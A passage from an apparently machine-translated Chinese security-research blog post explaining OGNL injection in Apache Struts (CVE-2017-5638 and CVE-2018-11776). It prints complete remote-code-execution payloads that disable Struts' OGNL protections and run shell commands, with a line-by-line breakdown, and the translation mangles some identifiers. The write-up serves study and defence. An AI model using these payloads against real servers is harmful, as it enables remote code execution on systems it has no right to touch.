.(%23context.setMemberAccess(%23dm)).(%23sl%3D@java.io.File@separator).(%23p%3Dnew%20java.lang.ProcessBuilder(%7B'bash'%2C'-c'%2C'xcalc'%7D)).(%23p.start())%7D/actionChain1.action)</code></pre></div><p>预期的结果应该是弹出计算器应用程序:</p><p><img src="../Images/7c2e0581ee34b3b5505ab9b2d82e90bf.png" alt="the calculator app" loading="lazy" data-original-src="https://pentest-tools.com/blog/img/asset/YXNzZXRzL2NvbnRlbnQvZXhwbG9pdGluZy1vZ25sLWluamVjdGlvbi1pbi1hcGFjaGUtc3RydXRzL2NhbGN1bGF0b3ItYXBwLnBuZw==?s=92977264bbe720b384ba936bcac69e02"/>看看调试器中的有效负载有助于理解它为什么工作。注意，string/struts 2-showcase/${2+4}/actionChain1 . action中的$ { 2+4 }在Struts中被称为<strong>命名空间</strong>，action chain 1就是动作。</p><div class="content-highlight"><pre class="code-block"><code>if (namespace == null) {
	namespace = invocation.getProxy().getNamespace(); // namespace is “/${2+4}”
}
…
String tmpLocation = actionMapper.getUriFromActionMapping(new ActionMapping(actionName, namespace, method, null));
setLocation(tmpLocation); // tmpLocation is “/${2+4}/register2.action”
super.execute(invocation);</code></pre></div><p>1.<strong>执行</strong>方法也调用<code>super.execute(invocation);</code></p><p>2.然后这个方法被称为:</p><div class="content-highlight"><pre class="code-block"><code>/**
Implementation of the `execute` method from the `Result` interface. This will call the abstract method
{@link #doExecute(String, ActionInvocation)} after optionally evaluating the location as an OGNL evaluation
*/
public void execute(ActionInvocation invocation) throws Exception {
    lastFinalLocation = conditionalParse(location, invocation);
    doExecute(lastFinalLocation, invocation);
}</code></pre></div><div class="content-highlight"><pre class="code-block"><code>/**
Parses the parameter for OGNL expressions against the valuestack
…
*/
protected String conditionalParse(String param, ActionInvocation invocation)
if (parse &amp;&amp; param != null &amp;&amp; invocation != null) {
    return TextParseUtil.translateVariables(
        param,
        invocation.getStack(),
        new EncodingParsedValueEvaluator());</code></pre></div><p>结果是执行任意OGNL表达式的可能性。关于这个问题的更多细节是<a target="_blank" rel="external nofollow noopener noreferrer" href="https://lgtm.com/blog/apache_struts_CVE-2018-11776">这里</a>和<a target="_blank" rel="external nofollow noopener noreferrer" href="https://lgtm.com/blog/apache_struts_CVE-2018-11776-part2">这里</a>。其要点是，当使用动作链时，来自用户的名称空间被OGNL解析。</p><h2 id="8-understanding-ognl-injection-payloads">8.了解OGNL注入有效载荷</h2><p>如果你想知道为什么公共漏洞中的有效载荷不是这样的:<code>%{@java.lang.Runtime@getRuntime().exec('command')}</code>，有两个原因。一个是指Struts维护者实现的保护机制，另一个与功能相关(读取命令的输出或使其跨平台)。</p><p>有用的细节可以在<a target="_blank" rel="external nofollow noopener noreferrer" href="https://lgtm.com/blog/apache_struts_CVE-2018-11776-exploit">这一页</a>上找到，但这里有一个简短的总结:</p><ol start="1"><li><p>在有效载荷执行期间作为<code>_memberAccess</code>可用的<code>SecurityMemberAccess</code>类决定OGNL可以做什么，但是可以选择使用更宽松的<code>DefaultMemberAccess</code>类。</p><ol start="1"><li><p>另一种保护是将类和包名列入黑名单。</p></li><li><p>不同的缓解可能是对调用静态方法的限制——这可以通过<code>_memberAccess</code>类的<code>allowStaticMethodAccess</code>字段来实现。</p></li></ol></li></ol><h3 id="cve-2017-5638-and-cve-2018-11776-payloads">CVE-2017-5638和CVE-2018-11776有效载荷:</h3><div class="content-highlight"><pre class="code-block"><code>(#_='multipart/form-data').

(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).

(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).

(#context['xwork.MethodAccessor.denyMethodExecution']=false).

(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).&gt;

(#ognlUtil.getExcludedPackageNames().clear()).

(#ognlUtil.getExcludedClasses().clear()).

(#context.setMemberAccess(#dm)))).

(#cmd='/usr/bin/touch /tmp/pwned').(#iswin=@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).

(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).

(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).

(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).

(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())</code></pre></div><ol start="1"><li><p># _ = '<strong>multipart/form-data '</strong>–需要一个随机变量，因为<code>multipart/form-data</code>字符串在我们的有效负载中是触发漏洞所必需的</p></li><li><p><strong> #dm=@ognl。OgnlContext@DEFAULT <em>成员</em>访问</strong>–使用DefaultMemberAccess的值创建dm变量(比SecurityMemberAccess更宽松)</p></li><li><p><strong> # <em> memberAccess？(#</em>member access = # DM)</strong>–如果<code>_memberAccess</code>类存在，我们用来自<code>dm</code>变量的<code>DefaultMemberAccess</code>替换它</p></li><li><p><strong># container = # context[' com . open symphony . xwork 2 . action context . container ']</strong>-从上下文中获取容器；以后有必要</p></li><li><p><strong># ognlUtil = # container . getinstance(@ com . open symphony . xwork 2 . ognl . ognlUtil @ class)</strong>–并使用它获取ognlUtil类的实例(我们不能直接这样做，因为它被列入了黑名单–完整列表在。/src/core/src/main/resources/struts-default . XML)</p></li><li><p><strong># ognlutil . getexcludedpackagenames()。clear()</strong>–清除排除的包名</p></li><li><p><strong># ognlutil . getexcludedclass()。clear()</strong>–清除排除的类</p></li><li><p><strong># context . set member access(# DM)</strong>–将<code>DefaultMemberAccess</code>设置为当前上下文</p></li><li><p><strong># cmd = '/usr/bin/touch/tmp/pwned '</strong>-定义我们要执行的命令</p></li><li><p><strong># iswin =(@ Java . lang . system @ getProperty(' OS . name ')。toLowerCase()。包含(' win ')</strong>–如果应用程序在Windows上运行，则保存在变量中(跨平台利用)</p></li><li><p><strong> #cmds=(#iswin？{'cmd.exe '，'/c '，#cmd}:{'/bin/bash '，'-c '，# cmd })</strong>-指定如何根据操作系统(cmd.exe或bash)执行命令</p></li><li><p><strong># p = new Java . lang . process builder(# cmds)</strong>–使用<code>ProcessBuilder</code>类运行命令(参数)</p></li><li><p><strong># p . redirect errorstream(true)</strong>–查看命令的错误输出可能也很有用</p></li><li><p><strong># process = # p . start()</strong>–执行命令</p></li><li><p><strong># ROS =(@ org . Apache . struts 2 . servletactioncontext @ getResponse()。getOutputStream())</strong>–获取响应的输出流，以将数据发送回用户</p></li><li><p><strong>@ org . Apache . commons . io . iou tils @ copy(# process . getinputstream()，# ROS)</strong>–获取执行命令的输出</p></li><li><p><strong># ROS . flush()</strong>–flush以确保我们发送了所有数据</p></li></ol><p>剥削CVE-2018-11776有些不同:</p><ol start="1"><li><p><strong># _ = # attr[' struts . valueStack ']</strong>–使用<em> attr </em>获取value stack</p></li><li><p><strong> #context=#_。get context()</strong>–然后用于获取上下文</p></li><li><p><strong># container = # context[' com . open symphony . xwork 2 . action context . container ']</strong>–获取容器</p></li><li><p><strong># ognlUtil = # container . getinstance(@ com . open symphony . xwork 2 . ognl . ognlUtil @ class)</strong>–获取对ognlUtil类的引用</p></li><li><p><strong># ognlutil . setexcludedclasses(')</strong>–清除排除的类</p></li><li><p><strong># ognlutil . setexcludedpackagenames(')</strong>–清除排除的包名</p></li><li><p><strong> #dm=@ognl。OgnlContext@DEFAULT <em>成员</em>访问</strong>–用值<code>DefaultMemberAccess</code>定义变量dm</p></li><li><p><strong># context . set member access(# DM)</strong>–设置<code>DefaultMemberAccess</code>而不是<code>SecurityMemberAccess</code></p></li><li><p><strong># sl = @ Java . io . file @ separator</strong>–未使用</p></li><li><p><strong># p = new Java . lang . ProcessBuilder({ ' bash '，'-c '，' xcalc ' })</strong>–用命令(xcalc)声明process builder</p></li><li><p><strong># p . start()</strong>–执行命令</p></li></ol><h2 id="9-conclusion">9.结论</h2><p>尽管Apache Struts是一个众所周知且广泛使用的框架，但由于缺乏公共安全研究，它仍然是一个容易攻击的目标。关于这个话题最有用的公共研究知识可以在LGTM的博客上找到。</p><p>OGNL注入漏洞影响Apache Struts的多个版本，是如何通过滥用代码中的现有功能来远程执行代码的一个很好的例子。</p><p>一开始，利用可能看起来很困难，但实际上并不困难，调试器总是会有所帮助。对于安全研究人员来说，熟悉Java可能很难，但这最终会变成一种优势。</p><p>全新的研究，耐心是最宝贵的品质。我们的建议是，当事情变得艰难时，不要扔掉你的玩具。并且经常提问——安全社区很友好，也很有帮助。</p>

                

                
              
            
          </div>
        </div>    
</body>
</html>